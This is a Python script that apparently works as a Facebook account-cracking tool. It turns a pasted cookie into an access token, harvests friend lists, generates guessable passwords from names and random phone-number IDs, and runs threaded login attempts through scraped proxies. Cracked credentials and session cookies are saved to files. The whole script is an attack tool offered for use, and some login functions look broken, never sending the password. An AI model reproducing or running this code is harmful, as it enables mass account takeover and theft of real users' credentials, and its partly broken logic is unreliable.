#DECODED BY @arsalanking && @arsalan_khan 
import requests
import bs4
import json
import os
import sys
import random
import datetime
import time
import re
import urllib3
import rich
import base64
import uuid
import string
from rich.table import Table as me
from rich.panel import Panel
from rich.console import Console as sol
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
pretty.install()
CON = sol()
import platform
import socket

dic = {
    '1': 'JANUARY',
    '2': 'FEBRUARY',
    '3': 'MARCH',
    '4': 'APRIL',
    '5': 'MAY',
    '6': 'JUNE',
    '7': 'JULY',
    '8': 'AUGUST',
    '9': 'SEPTEMBER',
    '10': 'OCTOBER',
    '11': 'NOVEMBER',
    '12': 'DECEMBER' 
}
dic2 = {
    '01': 'JANUARY',
    '02': 'FEBRUARY',
    '03': 'MARCH',
    '04': 'APRIL',
    '05': 'MAY',
    '06': 'JUNE',
    '07': 'JULY',
    '08': 'AUGUST',
    '09': 'SEPTEMBER',
    '10': 'OCTOBER',
    '11': 'NOVEMBER',
    '12': 'DECEMBER' 
}
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
date = str(tgl) + '/' + str(bln) + '/' + str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx - 12
    tag = 'PM'
else:
    a = ltx
    tag = 'AM'

ugen2 = []
ugen = []
cokbrut = []
ses = requests.Session()
princp = []
ugent = []

try:
    prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt', 'w').write(prox)
except Exception:
    pass

prox = open('.prox.txt', 'r').read().splitlines()

for xd in range(10000):
    a = 'Mozilla/5.0 (Symbian/3; Series60/'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'Nokia'
    e = random.randrange(100, 9999)
    f = '/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Mobile Safari/535.1'
    uaku = f'{a}{b}.{c} {d}{e}{f}{g}\x1b[38;5;46m.{i}.{j} {k}'
    ugen2.append(uaku)
    aa = 'Mozilla/5.0 (Linux; U; Android'
    b = random.choice(['6', '7', '8', '9', '10', '11', '12'])
    c = ' en-us; GT-'
    d = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e = random.randrange(1, 999)
    f = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36'
    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}\x1b[38;5;46m.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

(id, id2, loop, ok, cp, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni) = ([], [], 0, 0, 0, [], [], [], [], [], [], [], [])
cokbrut = []
pwpluss = []
pwnya = []
user = []
logincookie = []
apk_ck = []
bou = []
pcp = []
apk = []

P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = '\x1b[1;30m'
sir = '\x1b[41m\x1b[1;97m'
x = '\x1b[m'
m = '\x1b[1;91m'
k = '\x1b[93m'
h = '\x1b[1;92m'
hh = '\x1b[32m'
u = '\x1b[95m'
kk = '\x1b[33m'
b = '\x1b[1;96m'
p = '\x1b[0;34m'
A = '\x1b[1;97m'
R = '\x1b[38;5;196m'
Y = '\x1b[1;33m'
G = '\x1b[38;5;48m'

logo = '\x1b[37m  \t\n__________.__       .__                     .___\n\\______   \\__| ____ |  |__ _____ _______  __| _/\n |       _/  |/ ___\\|  |  \\__  \\_  __ \\/ __ | \n |    |   \\  \\  \\___|   Y  \\/ __ \\|  | \\/ /_/ | \n |____|_  /__|\\___  >___|  (____  /__|  \\____ | \n        \\/        \\/     \\/     \\/           \\/\x1b[38;5;196mv2.9 '

def animation(u):
    for e in u + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

def linex():
    print('\x1b[37m------------------------------------------------------------')

def info():
    print('\x1b[37m------------------------------------------------------------\n(\x1b[38;5;196m>>\x1b[37m) DEVLOPER  : \x1b[38;5;46mARSALAN\x1b[1;37m\n(\x1b[38;5;196m>>\x1b[37m) VERSION   :\x1b[38;5;46m 2.9 \x1b[38;5;46m \x1b[1;37m\n(\x1b[38;5;196m>>\x1b[37m) TOOL TYPE : \x1b[38;5;46mFILE > PUBLIC > RANDOM\n\x1b[37m------------------------------------------------------------')

try:
    response = requests.get('https://api.ipify.org?format=json')
    ipadd = response.json()['ip']
except:
    ipadd = '127.0.0.1'

def get_ip():
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        return ip_address
    except:
        return '127.0.0.1'

ip = get_ip()
try:
    sim = requests.get('http://ip-api.com/json/').json()['isp']
except:
    sim = 'Unknown'

current_time = datetime.datetime.now()
current_hour = current_time.hour
greeting = 'GOOD NIGHT     :'
if 5 <= current_hour < 12:
    greeting = 'GOOD MORNING    :'
elif 12 <= current_hour < 17:
    greeting = 'GOOD AFTERNOON  :'
elif 17 <= current_hour < 20:
    greeting = 'GOOD EVENING    :'

uname = input('>> WHAT IS YOUR NAME \x1b[38;5;196m: \x1b[1;37m')

def banner():
    print(logo)

def login():
    try:
        token = open('data/.token.txt', 'r').read()
        cok = open('data/.cok.txt', 'r').read()
        tokenku.append(token)
        sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token=' + tokenku[0], cookies = {'cookie': cok})
        sy2 = json.loads(sy.text)['name']
        sy3 = json.loads(sy.text)['id']
        menu(sy2, sy3)
    except Exception:
        login123()

def login123():
    os.system('clear')
    banner()
    info()
    print('\x1b[37m(\x1b[38;5;196m>>\x1b[37m)\x1b[1;37m ' + greeting, uname)
    print('\x1b[37m(\x1b[38;5;196m>>\x1b[37m)\x1b[1;37m TODAY FIX DATE  : ' + date)
    print('\x1b[37m(\x1b[38;5;196m>>\x1b[37m)\x1b[1;37m YOUR IP ADDRESS : ' + ip)
    print('\x1b[37m(\x1b[38;5;196m>>\x1b[37m)\x1b[1;37m YOUR DATA/WIFI  : ' + sim)
    linex()
    print('\x1b[1;37m[\x1b[38;5;196m1\x1b[1;97m]\x1b[1;97m CRACK PUBLIC   [\x1b[38;5;196m2\x1b[1;97m]\x1b[1;97m CRACK FILE')
    print('[\x1b[38;5;196m3\x1b[1;97m]\x1b[1;97m CRACK RANDOM   [\x1b[38;5;196m4\x1b[1;97m]\x1b[1;97m CONTACT ADMIN')
    print('[\x1b[38;5;196m5\x1b[1;97m]\x1b[1;97m FILE MAKING    [\x1b[38;5;196m0\x1b[1;97m]\x1b[1;97m EXIT TOOL ')
    linex()
    lgmt = input('CHOOSE : ')
    if lgmt == '1':
        login_lagi334()
    elif lgmt == '2':
        crack_file()
    elif lgmt == '3':
        RandomCloning()
    elif lgmt == '4':
        contact()
    elif lgmt == '5':
        soon()
    else:
        animation(' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m OPTION NOT FOUND')
        restart()

def contact():
    os.system('xdg-open https://facebook.com/profile.php?id=100000361707778&mibextid=ZbWKwL/')
    login()

def soon():
    linex()
    animation('(\x1b[38;5;196m>>\x1b[37m) THIS OPTION AVAILABLE IN NEXT UPDATE')
    login()

def restart():
    os.system(f'python {__file__}')
    sys.exit()

def login_lagi334():
    os.system('clear')
    print(logo)
    linex()
    cookie = input('\x1b[1;37m[\x1b[38;5;196m>>\x1b[1;37m] \x1b[1;37mCOOKIE : ')
    open('data/.cok.txt', 'w').write(cookie)
    rsn = requests.Session()
    rsn.headers.update({
        'Accept-Language': 'id,en;q=0.9',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'Referer': 'https://www.instagram.com/',
        'Host': 'www.facebook.com',
        'Sec-Fetch-Mode': 'cors',
        'Accept': '*/*',
        'Connection': 'keep-alive',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Dest': 'empty',
        'Origin': 'https://www.instagram.com',
        'Accept-Encoding': 'gzip, deflate' 
    })
    try:
        response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies = {'cookie': cookie})
        if '"access_token":' in str(response.headers):
            token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
            open('data/.token.txt', 'w').write(token)
            print(f'{h}Login Success{p}')
        else:
            print('[x] COOKIE EXPIRED....PLEASE INPUT FRESH COOKIE!!')
    except Exception as e:
        print(e)
    linex()
    input('Press Enter to back')
    login()

def menu(my_name, my_id):
    os.system('clear')
    banner()
    info()
    print('\x1b[37m(\x1b[38;5;196m>>\x1b[37m)\x1b[1;37m ' + greeting, uname)
    print('\x1b[37m(\x1b[38;5;196m>>\x1b[37m)\x1b[1;37m TODAY FIX DATE  : ' + date)
    print('\x1b[37m(\x1b[38;5;196m>>\x1b[37m)\x1b[1;37m YOUR IP ADDRESS : ' + ip)
    print('\x1b[37m(\x1b[38;5;196m>>\x1b[37m)\x1b[1;37m YOUR DATA/WIFI  : ' + sim)
    linex()
    print('[\x1b[38;5;196m1\x1b[1;37m] CRACK PUBLIC')
    print('[\x1b[38;5;196m2\x1b[1;37m] CRACK FILE')
    print('[\x1b[38;5;196m3\x1b[1;37m] CRACK RANDOM')
    print('[\x1b[38;5;196m4\x1b[1;37m] CHECK RESULTS')
    print('[\x1b[38;5;196m5\x1b[1;37m] CONTACT ADMIN')
    print('[\x1b[38;5;196m0\x1b[1;37m] EXIT TOOL')
    linex()
    cho = input(' CHOOSE : ')
    if cho == '1':
        dump_massal()
    elif cho == '2':
        crack_file()
    elif cho == '3':
        RandomCloning()
    elif cho == '4':
        result()
    elif cho == '5':
        contact()
    elif cho == '0':
        os.system('rm -rf data/.token.txt')
        exit()
    else:
        animation('[×] SELECT CORRECTLY ')
        login()

def dump_massal():
    token = open('data/.token.txt', 'r').read()
    cok = open('data/.cok.txt', 'r').read()
    print('')
    try:
        dwi = int(input('[\x1b[38;5;196m>>\x1b[1;37m] ENTER TARGET AMOUNT  : '))
    except:
        exit()
    ses = requests.Session()
    _dwi_ = 0
    for yantti in range(dwi):
        _dwi_ += 1
        Masukan = input('[\x1b[38;5;196m>>\x1b[1;37m] INPUT UID ' + str(_dwi_) + ' : ')
        uid.append(Masukan)
    for user in uid:
        try:
            head = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36'}
            params = {'access_token': token, 'fields': 'friends'}
            url = requests.get('https://graph.facebook.com/{}'.format(user), params = params, headers = head, cookies = {'cookies': cok}).json()
            for proses in url['friends']['data']:
                woy = proses['id'] + '|' + proses['name']
                if woy in id:
                    pass
                else:
                    id.append(woy)
        except Exception:
            pass
    setting()

def crack_file():
    linex()
    o = input('[\x1b[38;5;196m>>\x1b[1;37m] FILE NAME : ')
    try:
        lin = open(o).read().splitlines()
        for xid in lin:
            id.append(xid)
        setting()
    except:
        animation(' [×] FILE NOT FOUND')
        time.sleep(2)
        login()

def setting():
    linex()
    print('[\x1b[38;5;196m1\x1b[1;37m] CRACK OLD IDZ')
    print('[\x1b[38;5;196m2\x1b[1;37m] CRACK NEW IDZ')
    print('[\x1b[38;5;196m3\x1b[1;37m] CRACK MIX IDZ')
    linex()
    hu = input('[\x1b[38;5;196m>>\x1b[1;37m] CHOOSE : ')
    if hu in ('1', '01'):
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ('2', '02'):
        muda = []
        for bacot in sorted(id):
            muda.append(bacot)
        bcm = len(muda)
        bcmi = bcm - 1
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -= 1
    elif hu in ('3', '03'):
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)
    else:
        for bacot in id:
            id2.append(bacot)
            
    linex()
    print('[\x1b[38;5;196m>>\x1b[1;37m] LOGIN METHOD ')
    linex()
    print('[\x1b[38;5;196m1\x1b[1;37m] M-BASIC FACEBOOK')
    print('[\x1b[38;5;196m2\x1b[1;37m] FREE FACEBOOK')
    linex()
    hc = input('[\x1b[38;5;196m>>\x1b[1;37m] CHOOSE : ')
    if hc in ('2', '02', '4'):
        method.append('free')
    else:
        method.append('mobile')
        
    linex()
    _____cowok__pink_____ = input('\x1b[37m(\x1b[38;5;196m>>\x1b[37m) DO YOU WANT TO SHOW CP (y/n) : ')
    if _____cowok__pink_____ in ('y', 'Y', '1'):
        akun.append('y')
    else:
        akun.append('n')
        
    passwrd()

def passwrd():
    os.system('clear')
    print(logo)
    linex()
    print('\x1b[37m(\x1b[38;5;196m>>\x1b[37m)\x1b[37m TOTAL ACCOUNT :\x1b[38;5;196m', str(len(id)))
    print('\x1b[37m(\x1b[38;5;196m>>\x1b[37m)\x1b[1;37m TODAYS DATE   : ' + date)
    linex()
    pool = tred(max_workers = 30)
    for yuzong in id2:
        nmf = yuzong.split('|')[1].lower()
        idf = yuzong.split('|')[0]
        frs = nmf.split(' ')[0]
        pwv = []
        if len(nmf) < 6:
            if len(frs) < 3:
                pass
            else:
                pwv.append(frs + '@123')
                pwv.append(frs + '123')
                pwv.append(frs + '1234')
                pwv.append(nmf)
        else:
            pwv.append(frs + '@123')
            pwv.append(frs + '123')
            pwv.append(frs + '1234')
            pwv.append(frs + '12345')
            pwv.append(nmf)
            pwv.append(frs + '@12345')
            pwv.append(frs + '456')
            pwv.append(frs + '321')
            
        if 'free' in method:
            pool.submit(crackfree, idf, pwv)
        else:
            pool.submit(crack, idf, pwv)
            
    linex()
    print(' The process has completed')
    input(' Press enter to back ')
    login()

def crack(idf, pwv):
    global ok, cp, loop
    sys.stdout.write(f'\r\x1b[37m[ARSALAN] {loop}/{len(id)} OK[\x1b[38;5;46m{ok}\x1b[37m] [{'{:.0%}'.format(loop / float(len(id)))}]  ')
    sys.stdout.flush()
    ses = requests.Session()
    for pw in pwv:
        try:
            nip = random.choice(prox)
            proxs = {'http': 'socks4://' + nip}
            ses.get('https://m.facebook.com')
            data = {'bi_xrwh': 0}
            headers = {
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                'viewport-width': '980'
            }
            po = ses.post('https://m.facebook.com/login/device-based/login/async/', data=data, headers=headers, proxies=proxs)
            if 'c_user' in ses.cookies.get_dict().keys():
                ok += 1
                kuki = ";".join([f"{key}={value}" for key, value in ses.cookies.get_dict().items()])
                print(f'\r\x1b[38;5;46m[ARSALAN-OK] {idf} >> {pw}')
                open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                break
            elif 'checkpoint' in po.cookies.get_dict().keys():
                cp += 1
                open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                break
        except:
            pass
    loop += 1

def crackfree(idf, pwv):
    global cp, ok, loop
    sys.stdout.write(f'\r\x1b[37m[ARSALAN] {loop}/{len(id)} OK[\x1b[38;5;46m{ok}\x1b[37m] [{'{:.0%}'.format(loop / float(len(id)))}]  ')
    sys.stdout.flush()
    ses = requests.Session()
    for pw in pwv:
        try:
            nip = random.choice(prox)
            proxs = {'http': 'socks4://' + nip}
            
            heade = {
                'authority': 'm.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'dpr': '2',
                'referer': 'https://www.google.com/',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-full-version-list': '"Chromium";v="139.0.7339.0", "Not;A=Brand";v="99.0.0.0"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-model': '"TECNO KM5"',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"15.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
                'viewport-width': '980',
            }
            
            p = ses.get('https://free.facebook.com/login/device-based/validate-password/?shbl=0', headers=heade, proxies=proxs, allow_redirects=False)
            
            lsd_match = re.search('name="lsd" value="(.*?)"', str(p.text))
            jazoest_match = re.search('name="jazoest" value="(.*?)"', str(p.text))
            
            if not lsd_match or not jazoest_match:
                loop += 1
                continue
                
            dataa = {
                'lsd': lsd_match.group(1),
                'jazoest': jazoest_match.group(1),
                'uid': idf,
                'next': 'https://free.facebook.com/login/save-device/',
                'flow': 'login_no_pin',
                'pass': pw
            }
            
            koki = ";".join([f"{key}={value}" for key, value in p.cookies.get_dict().items()])
            koki += '; m_pixel_ratio=2; wd=360x800'
            
            po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, cookies={'cookie': koki}, headers=heade, allow_redirects=False, proxies=proxs)
            
            if 'checkpoint' in po.cookies.get_dict().keys():
                open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                cp += 1
                break
            elif 'c_user' in ses.cookies.get_dict().keys():
                ok += 1
                kuki = ";".join([f"{key}={value}" for key, value in ses.cookies.get_dict().items()])
                print(f'\r{P}\x1b[38;5;46m[{time.strftime("ARSALAN")}-OK] {idf} │ {pw} {P}')
                open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                break
        except Exception as e:
            pass
            
    loop += 1

def RandomCloning():
    os.system('clear')
    banner()
    linex()
    print('\x1b[37m[+] EXAMPLE   : 0300,0301,9816 etc')
    code = input('[+] SIM CODE  : ')
    linex()
    try:
        limit = int(input('[+] EXAMPLE   : 5000,1000,15000\n[+] CRACK ID  : '))
    except:
        limit = 5000
    linex()
    for a in range(limit):
        awm = ''.join(random.choice(string.digits) for _ in range(6))
        bou.append(awm)
    cpp = input('[+] SHOW CHECKPOINT ID [Y/N] : ')
    linex()
    if cpp in ('n', 'N', 'NO'):
        pcp.append('n')
    else:
        pcp.append('y')
    app = input('[+] SHOW APK && WEBSITE [Y/N] : ')
    linex()
    if app in ('N', 'n', 'No', 'NO'):
        apk.append('n')
    else:
        apk.append('y')
    AwmZone = tred(max_workers = 15)
    os.system('clear')
    banner()
    linex()
    print('\x1b[37m[+] TOTAL ID : \x1b[32m', str(len(bou)))
    print('\x1b[37m[+] USE AIRPLANE MODE FOR GOOD RESULT')
    linex()
    for love in bou:
        ids = code + love
        passlist = [
            ids[:6],
            ids[:7],
            ids[:8],
            love,
            ids[2:],
            ids[3:],
            'pakistan',
            'khan123',
            'ali123',
            '786786',
            '123456'
        ]
        AwmZone.submit(cracker, ids, passlist)
    linex()
    print(' The process has completed')
    input(' Press enter to back ')
    login()

def cracker(ids, passlist):
    global ok, cp, loop
    sys.stdout.write(f'\r\r\x1b[37m[ARSALAN] {loop}|RANDOM \x1b[38;5;46m[OK-:{ok}]')
    sys.stdout.flush()
    for pas in passlist:
        try:
            data = {
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d' 
            }
            head = {
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'ef0e330bff1cd312f36aa5f2c69c59a9' 
            }
            po = requests.post('https://graph.facebook.com/auth/login', data = data, headers = head, verify = True).json()
            if 'access_token' in po:
                uid = str(po['uid'])
                print(f'\r\r\x1b[38;5;46m[ARSALAN-OK] {uid} | {pas}')
                open('/sdcard/ARSALAN-RNDM-OK.txt', 'a').write(uid + '|' + pas + '\n')
                ok += 1
                break
            elif 'www.facebook.com' in str(po):
                if 'y' in pcp:
                    print(f'\r\r\x1b[38;5;196m [ARSALAN-CP] {ids} | {pas}')
                open('/sdcard/ARSALAN-CP.txt', 'a').write(ids + '|' + pas + '\n')
                cp += 1
                break
        except:
            pass
    loop += 1

def result():
    linex()
    os.system('clear')
    banner()
    linex()
    print('[\x1b[38;5;196m1\x1b[1;37m] CHECK CP IDZ ')
    print('[\x1b[38;5;196m2\x1b[1;37m] CHECK OK IDZ ')
    print('[\x1b[38;5;196m0\x1b[1;37m] EXIT ')
    linex()
    kz = input('[\x1b[38;5;196m•\x1b[1;37m] CHOOSE : ')
    if kz in ('1', '01'):
        try:
            vin = os.listdir('CP')
            for isi in vin:
                hem = open('CP/' + isi, 'r').readlines()
                print(isi + ' : ' + str(len(hem)))
        except:
            print('No CP results found')
        input('Press enter to back')
        login()
    elif kz in ('2', '02'):
        try:
            vin = os.listdir('OK')
            for isi in vin:
                hem = open('OK/' + isi, 'r').readlines()
                print(isi + ' : ' + str(len(hem)))
        except:
            print('No OK results found')
        input('Press enter to back')
        login()
    else:
        login()

if __name__ == '__main__':
    for folder in ['OK', 'CP', 'data']:
        if not os.path.exists(folder):
            os.mkdir(folder)
    if not os.path.exists('.prox.txt'):
        open('.prox.txt', 'w').close()
    login()
